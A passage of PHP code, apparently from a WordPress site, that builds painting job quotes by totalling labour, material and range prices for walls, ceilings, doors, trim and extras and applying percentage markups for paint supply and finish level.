                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$p_rooms_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $p_rooms_total = $p_rooms_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($p_rooms_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $p_rooms_total = $p_rooms_total + ($range_price_total * $extra_count);
                                }

                        }
                }

                $paint_ceilings = $data['paint_ceilings'];
                $paint_ceilings_total = 0;
                foreach($paint_ceilings_data as $temp) {
                        if( $temp['title'] == $paint_ceilings ) {

                                $range_price_total = $temp['range_price'];
                                $paint_ceilings_total = $range_price_total;

                        }

                }

                $paint_supply = $data['paint'];
                $paint_supply_total = 0;
                foreach($paint_supply_data as $temp) {
                        if( $temp['title'] == $paint_supply ) {

                                $range_price_total = $temp['range_price'];
                                $paint_supply_total = $range_price_total;

                        }
                }

                $extras = $data['doors'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each extra field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extra_count = $data['' . $count_field_title . ''];
                                if($extra_count == NULL || $extra_count == '' || empty($extra_count)) {
                                       $extra_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total + ($labour_and_material_total * $extra_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ($range_price_total * $extra_count);
                                }

                        }
                }

                $other = $data['other'];
                $other_total = 0;
                foreach($other_data as $temp) {
                        if( $temp['title'] == $other ) {

                                if($other_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$other_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $other_total = $other_total + $labour_and_material_total;
                                }
                                elseif($other_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $other_total = $other_total + $range_price_total;
                                }

                        }
                }

                $trim = $data['extras'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total + $labour_and_material_total;
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + $range_price_total;
                                }

                        }
                }

                $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
					
                $percent_total = $height_total + $paint_ceilings_total + $trim_total;
                $rooms_price_total = $p_rooms_total + ($p_rooms_total * $percent_total / 100) + $other_total + $extras_total;
					      $level_markup = $room_price_total * $level_total / 100;
                $paint_interior_total = $rooms_price_total + $level_markup + ($rooms_price_total * $paint_supply_total / 100);


                $total = $total + $paint_interior_total;

        }

	// formulas for room painting
        if(get_the_title($t) == 'Wall Area') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $width = $data['area_width'];
                                  $height = $data['area_height'];
                                  foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current_walls') {
                                                $current_walls_title = $d['title'];
                                                $current_walls_prices = $d['type_of_price'];
                                                $current_walls_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'wall_prep') {
                                                $wall_prep_title = $d['title'];
                                                $wall_prep_prices = $d['type_of_price'];
                                                $wall_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_walls') {
                                                $new_walls_title = $d['title'];
                                                $new_walls_prices = $d['type_of_price'];
                                                $new_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'doors') {
                                                $doors_title = $d['title'];
                                                $doors_prices = $d['type_of_price'];
                                                $doors_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }   																}

					
	                              $wall_area = $width * $height ;
                                $outer_length = $width ;

                $current_walls = $data['current_walls'];
                $current_walls_total = 0;
                foreach($current_walls_data as $temp) {
                        if( in_array($temp['title'],$current_walls) ) {


                                if($current_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_walls_total = $current_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_walls_total = $current_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $wall_prep = $data['wall_prep'];
                $wall_prep_total = 0;
                foreach($wall_prep_data as $temp) {
                        if( in_array($temp['title'],$wall_prep) ) {

                                if($wall_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        $wall_prep_total = $wall_prep_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($wall_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_prep_total = $wall_prep_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $new_walls = $data['new_walls'];
                $new_walls_total = 0;
                foreach($new_walls_data as $temp) {
                        if( in_array($temp['title'],$new_walls) ) {

                                       if($new_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_walls_total = $new_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($new_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_walls_total = $new_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $doors_count = $data['' . $count_field_title . ''];
                                if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
                                       $doors_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $doors_count);
                                }

                        }

                }

                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $outer_length);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $outer_length);
                                }

                        }

                }


					      $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                $range_price_total = $temp['range_price'];
                                $paint_total = $range_price_total;

                        }
                }

					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
	                              $painting_total = $current_walls_total + $wall_prep_total + $new_walls_total + $doors_total + $extras_total + $current_ceiling_total + $ceiling_prep_total + $new_ceiling_total + $trim_total;
                                $level_markup = $painting_total * $level_total / 100;
					                      $paint_supply = $painting_total * $paint_total / 100;
					                      $paint_room_total = $painting_total + $paint_supply + $level_markup;

                                $total = $total + $paint_room_total;


                }
       
	      
        // formulas for room painting
        if(get_the_title($t) == 'Area') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $ceilingwidth = $data['ceilingarea_width'];
                                  $ceilinglength = $data['ceilingarea_length'];
					                        $walllength = $data['wallarea_width'];
                                  $wallheight = $data['wallarea_height'];
                                  foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current_walls') {
                                                $current_walls_title = $d['title'];
                                                $current_walls_prices = $d['type_of_price'];
                                                $current_walls_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'wall_prep') {
                                                $wall_prep_title = $d['title'];
                                                $wall_prep_prices = $d['type_of_price'];
                                                $wall_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_walls') {
                                                $new_walls_title = $d['title'];
                                                $new_walls_prices = $d['type_of_price'];
                                                $new_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'current_ceiling') {
                                                $current_ceiling_title = $d['title'];
                                                $current_ceiling_prices = $d['type_of_price'];
                                                $current_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'ceiling_prep') {
                                                $ceiling_prep_title = $d['title'];
                                                $ceiling_prep_prices = $d['type_of_price'];
                                                $ceiling_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_ceiling') {
                                                $new_ceiling_title = $d['title'];
                                                $new_ceiling_prices = $d['type_of_price'];
                                                $new_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'doors') {
                                                $doors_title = $d['title'];
                                                $doors_prices = $d['type_of_price'];
                                                $doors_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'extras') {
                                                $extras_title = $d['title'];
                                                $extras_prices = $d['type_of_price'];
                                                $extras_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'trim') {
                                                $trim_title = $d['title'];
                                                $trim_prices = $d['type_of_price'];
                                                $trim_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'paint') {
                                                $paint_title = $d['title'];
                                                $paint_prices = $d['type_of_price'];
                                                $paint_data = $d['fields'];
                                        }   																}

                                
	                              $wall_area = $walllength * $wallheight;
                                $ceiling_area = $ceilingwidth * $ceilinglength;

                $current_walls = $data['current_walls'];
                $current_walls_total = 0;
                foreach($current_walls_data as $temp) {
                        if( in_array($temp['title'],$current_walls) ) {


                                if($current_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_walls_total = $current_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($current_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_walls_total = $current_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $wall_prep = $data['wall_prep'];
                $wall_prep_total = 0;
                foreach($wall_prep_data as $temp) {
                        if( in_array($temp['title'],$wall_prep) ) {

                                if($wall_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        $wall_prep_total = $wall_prep_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($wall_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $wall_prep_total = $wall_prep_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

                $new_walls = $data['new_walls'];
                $new_walls_total = 0;
                foreach($new_walls_data as $temp) {
                        if( in_array($temp['title'],$new_walls) ) {

                                       if($new_walls_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_walls_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_walls_total = $new_walls_total +  ( $labour_and_material_total * $wall_area);
                                }
                                elseif($new_walls_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_walls_total = $new_walls_total + ( $range_price_total * $wall_area);
                                }

                        }

                }

	              $current_ceiling = $data['current_ceiling'];
                $current_ceiling_total = 0;
                foreach($current_ceiling_data as $temp) {
                        if( in_array($temp['title'],$current_ceiling) ) {


                                if($current_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$current_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $current_ceiling_total = $current_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($current_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $current_ceiling_total = $current_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }

                $ceiling_prep = $data['ceiling_prep'];
                $ceiling_prep_total = 0;
                foreach($ceiling_prep_data as $temp) {
                        if( in_array($temp['title'],$ceiling_prep) ) {


                                if($ceiling_prep_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$ceiling_prep_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $ceiling_prep_total = $ceiling_prep_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($ceiling_prep_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $ceiling_prep_total = $ceiling_prep_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $new_ceiling = $data['new_ceiling'];
                $new_ceiling_total = 0;
                foreach($new_ceiling_data as $temp) {
                        if( in_array($temp['title'],$new_ceiling) ) {


                                if($new_ceiling_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$new_ceiling_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $new_ceiling_total = $new_ceiling_total +  ( $labour_and_material_total * $ceiling_area);
                                }
                                elseif($new_ceiling_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $new_ceiling_total = $new_ceiling_total + ( $range_price_total * $ceiling_area);
                                }

                        }

                }


                $doors = $data['doors'];
                $doors_total = 0;
                foreach($doors_data as $temp) {
                        if( in_array($temp['title'],$doors) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $doors_count = $data['' . $count_field_title . ''];
                                if($doors_count == NULL || $doors_count == '' || empty($doors_count)) {
                                       $doors_count = 1;
                                }

                                if($doors_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$doors_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $doors_total = $doors_total +  ( $labour_and_material_total * $doors_count);
                                }
                                elseif($doors_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $doors_total = $doors_total + ( $range_price_total * $doors_count);
                                }

                        }

                }

                $extras = $data['extras'];
                $extras_total = 0;
                foreach($extras_data as $temp) {
                        if( in_array($temp['title'],$extras) ) {

                                // let's count QNT of each doors field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $extras_count = $data['' . $count_field_title . ''];
                                if($extras_count == NULL || $extras_count == '' || empty($extras_count)) {
                                       $extras_count = 1;
                                }

                                if($extras_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$extras_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $extras_total = $extras_total +  ( $labour_and_material_total * $extras_count);
                                }
                                elseif($extras_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $extras_total = $extras_total + ( $range_price_total * $extras_count);
                                }

                        }

                }

                $trim = $data['trim'];
                $trim_total = 0;
                foreach($trim_data as $temp) {
                        if( in_array($temp['title'],$trim) ) {

                                // let's count QNT of each trim field
                                $field_title = $temp['title'];
                                $count_field_title = preg_replace("/[^a-zA-Z0-9]/", "", $field_title);
                                $count_field_title = strtolower($count_field_title);
                                $trim_count = $data['' . $count_field_title . ''];
                                if($trim_count == NULL || $trim_count == '' || empty($trim_count)) {
                                       $trim_count = 1;
                                }

                                if($trim_prices == 'labour') {
                                        $labour_price_total = $temp['labour'];
                                        $labour_price_total_value = 0;
                                        $material_price_total = $temp['material'];
                                        $material_price_total_value = 0;
                                        foreach($labour_price_total as $l) {
                                                $labour_price_total_value = $labour_price_total_value + $l['price'];
                                        }
                                        foreach($material_price_total as $m) {
                                                $material_price_total_value = $material_price_total_value + $m['price'];
                                        }
                                        $labour_and_material_total = $labour_price_total_value + $material_price_total_value;
                                        // calculate selected selection price: SelectionsArray, firstName (section title), secondName (value title)
                                        $selectionPrice = 0;
                                        $selectionPrice = go_calculate_selection($selectionsData,$trim_title,$temp['title']);
                                        $labour_and_material_total = $labour_and_material_total + $selectionPrice;
                                        // *** END ***

                                        $trim_total = $trim_total +  ( $labour_and_material_total * $trim_count);
                                }
                                elseif($trim_prices == 'range') {
                                        $range_price_total = $temp['range_price'];
                                        $trim_total = $trim_total + ( $range_price_total * $trim_count);
                                }

                        }

                }


					      $paint = $data['paint'];
                $paint_total = 0;
                foreach($paint_data as $temp) {
                        if( $temp['title'] == $paint ) {

                                $range_price_total = $temp['range_price'];
                                $paint_total = $range_price_total;

                        }
                }

					      $level = $data['level'];
                $level_total = 0;
                foreach($level_data as $temp) {
                        if( $temp['title'] == $level ) {

                                $range_price_total = $temp['range_price'];
                                $level_total = $range_price_total;

                        }
                }
	                              $painting_total = $current_walls_total + $wall_prep_total + $new_walls_total + $doors_total + $extras_total + $current_ceiling_total + $ceiling_prep_total + $new_ceiling_total + $trim_total;
                                $level_markup = $painting_total * $level_total / 100;
					                      $paint_supply = $painting_total * $paint_total / 100;
					                      $paint_room_total = $painting_total + $paint_supply + $level_markup;

                                $total = $total + $paint_room_total;


                }
        
	
	  // formulas for room painting
        if(get_the_title($t) == 'Paint Area') {

                                  $all_scope_data = get_field('quote_fields',$t);

                                  $ceilingwidth = $data['ceilingarea_width'];
                                  $ceilinglength = $data['ceilingarea_length'];
					                        $walllength = $data['wallarea_width'];
                                  $wallheight = $data['wallarea_height'];
                                  foreach($all_scope_data as $d) {
                                        if($d['slug'] == 'current_walls') {
                                                $current_walls_title = $d['title'];
                                                $current_walls_prices = $d['type_of_price'];
                                                $current_walls_data = $d['fields'];
                                        }
																		    if($d['slug'] == 'level') {
                                                $level_title = $d['title'];
                                                $level_prices = $d['type_of_price'];
                                                $level_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'wall_prep') {
                                                $wall_prep_title = $d['title'];
                                                $wall_prep_prices = $d['type_of_price'];
                                                $wall_prep_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'new_walls') {
                                                $new_walls_title = $d['title'];
                                                $new_walls_prices = $d['type_of_price'];
                                                $new_walls_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'current_ceiling') {
                                                $current_ceiling_title = $d['title'];
                                                $current_ceiling_prices = $d['type_of_price'];
                                                $current_ceiling_data = $d['fields'];
                                        }
                                        if($d['slug'] == 'ceiling_prep') {
                                                $ceiling_prep_title = $d['title'];
                                                $ceiling_prep_prices = $d['type_of_price'];
                                                $ceiling_prep_data = $d['fields'];
                                        }
